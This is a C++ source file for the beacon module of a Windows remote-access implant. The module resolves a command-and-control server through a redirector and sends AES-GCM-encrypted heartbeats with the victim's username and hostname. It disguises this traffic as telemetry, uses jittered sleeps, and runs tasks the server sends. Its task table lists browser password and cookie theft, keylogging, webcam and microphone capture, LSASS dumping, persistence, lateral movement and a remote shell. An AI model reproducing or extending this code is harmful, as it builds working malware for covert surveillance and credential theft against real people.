#include "Beacon.h"
#include "../core/Config.h"
#include "../core/ImplantId.h"
#include "../crypto/AesGcm.h"
#include "../http/RedirectorResolver.h"
#include "../http/WinHttpClient.h"
#include "Task.h"
#include "../external/nlohmann/json.hpp"
#include <chrono>
#include <random>
#include <thread>
#include <vector>
#include <algorithm>
#include "../utils/Logger.h"
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>
#include <winhttp.h>


namespace {
    beacon::TaskType stringToTaskType(const std::string& str) {
        if (str == "sysinfo") return beacon::TaskType::SYSINFO;
        if (str == "installed_software") return beacon::TaskType::INSTALLED_APPS;
        if (str == "wifi_dump") return beacon::TaskType::WIFI_DUMP;
        if (str == "browser_pass") return beacon::TaskType::BROWSER_PASS;
        if (str == "cookie_steal") return beacon::TaskType::COOKIE_STEAL;
        if (str == "screenshot") return beacon::TaskType::SCREENSHOT;
        if (str == "keylog") return beacon::TaskType::KEYLOG;
        if (str == "webcam") return beacon::TaskType::WEBCAM;
        if (str == "mic") return beacon::TaskType::MIC;
        if (str == "webcam_stream") return beacon::TaskType::WEBCAM_STREAM;
        if (str == "screen_stream") return beacon::TaskType::SCREEN_STREAM;
        if (str == "ishell" || str == "shell") return beacon::TaskType::ISHELL;
        if (str == "deep_recon") return beacon::TaskType::DEEP_RECON;
        if (str == "browse_fs") return beacon::TaskType::BROWSE_FS;
        if (str == "file_download") return beacon::TaskType::FILE_DOWNLOAD;
        if (str == "file_upload") return beacon::TaskType::FILE_UPLOAD;
        if (str == "execute_assembly") return beacon::TaskType::EXECUTE_ASSEMBLY;
        if (str == "socks_proxy") return beacon::TaskType::SOCKS_PROXY;
        if (str == "adv_persistence") return beacon::TaskType::ADV_PERSISTENCE;
        if (str == "dump_lsass") return beacon::TaskType::DUMP_LSASS;
        if (str == "lateral_rce") return beacon::TaskType::LATERAL_RCE;
        if (str == "lateral_wireless") return beacon::TaskType::LATERAL_WIRELESS;
        // Add other mappings here
        return beacon::TaskType::UNKNOWN;
    }

    std::string getUsername() {
        DWORD username_len = 0;
        GetUserNameW(NULL, &username_len);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            std::vector<wchar_t> username(username_len);
            if (GetUserNameW(username.data(), &username_len)) {
                int len = WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, NULL, 0, NULL, NULL);
                std::string result(len, 0);
                WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, &result[0], len, NULL, NULL);
                return result;
            }
        }
        return "Unknown";
    }

    std::string getHostname() {
        DWORD hostname_len = 0;
        GetComputerNameW(NULL, &hostname_len);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            std::vector<wchar_t> hostname(hostname_len);
            if (GetComputerNameW(hostname.data(), &hostname_len)) {
                int len = WideCharToMultiByte(CP_UTF8, 0, hostname.data(), hostname_len, NULL, 0, NULL, NULL);
                std::string result(len, 0);
                WideCharToMultiByte(CP_UTF8, 0, hostname.data(), hostname_len, &result[0], len, NULL, NULL);
                return result;
            }
        }
        return "Unknown";
    }
}

namespace beacon {

Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
    implantId_ = core::generateImplantId();
    LOG_INFO("Implant initialized with ID: " + implantId_);
}

void Beacon::sleepWithJitter() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::normal_distribution<> d(core::SLEEP_BASE, core::SLEEP_BASE * (core::JITTER_PCT / 100.0));
    double sleep_duration = std::max(3.0, d(gen));
    std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<int>(sleep_duration * 1000)));
}

void Beacon::run() {
    http::RedirectorResolver resolver(core::REDIRECTOR_URL);
    std::vector<BYTE> beacon_key_vec(core::BEACON_KEY, core::BEACON_KEY + 32);
    crypto::AesGcm aes(beacon_key_vec);

    while (true) {
        if (c2Url_.empty()) {
            try {
                LOG_DEBUG("Attempting to resolve C2 URL from: " + std::string(core::REDIRECTOR_URL));
                c2Url_ = resolver.resolve();
                LOG_INFO("C2 URL resolved: " + c2Url_);
                c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
            } catch (const std::exception&) {
                std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
                if (c2FetchBackoff_ < 35 * 60) {
                    c2FetchBackoff_ *= 2;
                }
                continue;
            }
        }
        bool hasMoreData = false;
        try {
            nlohmann::json payload = {
                {"id", implantId_},
                {"os", "windows"},
                {"arch", "amd64"},
                {"user", getUsername()},
                {"host", getHostname()},
                {"results", nlohmann::json::array()}
            };
            LOG_DEBUG("Sending beacon heart-beat...");

            // Move limited subset of results to in-flight to avoid 413
            int cappedCount = 0;
            Result result;
            while (cappedCount < 10 && pendingResults_.try_dequeue(result)) {
                inFlightResults_.push_back(result);
                cappedCount++;
            }

            for (const auto& res : inFlightResults_) {
                payload["results"].push_back({
                    {"task_id", res.task_id},
                    {"output", res.output},
                    {"error", res.error}
                });
            }

            std::string payload_str = payload.dump();
            
            // If we have more data, we'll skip sleep later
            hasMoreData = pendingResults_.size_approx() > 0;
            std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());

            std::vector<BYTE> nonce(12);
            HCRYPTPROV hProv;
            if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                continue;
            }
            if (!CryptGenRandom(hProv, 12, nonce.data())) {
                CryptReleaseContext(hProv, 0);
                continue;
            }
            CryptReleaseContext(hProv, 0);

            std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
            std::vector<BYTE> encrypted_payload;
            encrypted_payload.insert(encrypted_payload.end(), nonce.begin(), nonce.end());
            encrypted_payload.insert(encrypted_payload.end(), ciphertext.begin(), ciphertext.end());

            std::wstring wideC2Url(c2Url_.begin(), c2Url_.end());
            URL_COMPONENTSW urlComp;
            wchar_t serverName[256];
            wchar_t path[256];

            memset(&urlComp, 0, sizeof(urlComp));
            urlComp.dwStructSize = sizeof(urlComp);
            urlComp.lpszHostName = serverName;
            urlComp.dwHostNameLength = sizeof(serverName) / sizeof(wchar_t);
            urlComp.lpszUrlPath = path;
            urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);

            if (!WinHttpCrackUrl(wideC2Url.c_str(), static_cast<DWORD>(wideC2Url.length()), 0, &urlComp)) {
                c2Url_ = "";
                continue;
            }

            http::WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
            std::wstring headers = L"X-Telemetry-Key: " + std::wstring(core::API_KEY.begin(), core::API_KEY.end()) + L"\r\n";
            std::vector<BYTE> response = client.post(std::wstring(urlComp.lpszHostName), std::wstring(urlComp.lpszUrlPath), encrypted_payload, headers);

            if (response.size() >= 12) {
                std::vector<BYTE> response_nonce(response.begin(), response.begin() + 12);
                std::vector<BYTE> response_ciphertext(response.begin() + 12, response.end());
                std::vector<BYTE> decrypted_response = aes.decrypt(response_ciphertext, response_nonce);

                std::string decrypted_str(decrypted_response.begin(), decrypted_response.end());
                nlohmann::json response_json = nlohmann::json::parse(decrypted_str);

                if (response_json.contains("ack_ids")) {
                    std::vector<std::string> ack_ids = response_json["ack_ids"].get<std::vector<std::string>>();
                    inFlightResults_.erase(
                        std::remove_if(inFlightResults_.begin(), inFlightResults_.end(),
                            [&ack_ids](const Result& res) {
                                return std::find(ack_ids.begin(), ack_ids.end(), res.task_id) != ack_ids.end();
                            }),
                        inFlightResults_.end()
                    );
                }

                if (response_json.contains("tasks")) {
                    for (const auto& task_json : response_json["tasks"]) {
                        Task task;
                        task.task_id = task_json["task_id"];
                        task.type = stringToTaskType(task_json["type"]);
                        task.cmd = task_json.value("cmd", "");

                        LOG_INFO("Received task: " + task.task_id + " (" + task_json["type"].get<std::string>() + ")");
                        std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, task).detach();
                    }
                }
            }

        } catch (const std::exception& e) {
            LOG_ERR("Beacon failed: " + std::string(e.what()));
            // Clear in-flight results if they are likely causing 413/failure
            // This prevents the 2GB memory leak
            if (inFlightResults_.size() > 5) {
                LOG_WARN("Clearing in-flight results to recover from potential 413/network error");
                inFlightResults_.clear();
            }
        }

        // If data is pending, flush it faster instead of full sleep
        if (hasMoreData) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        } else {
            sleepWithJitter();
        }
    }
}

} // namespace beacon
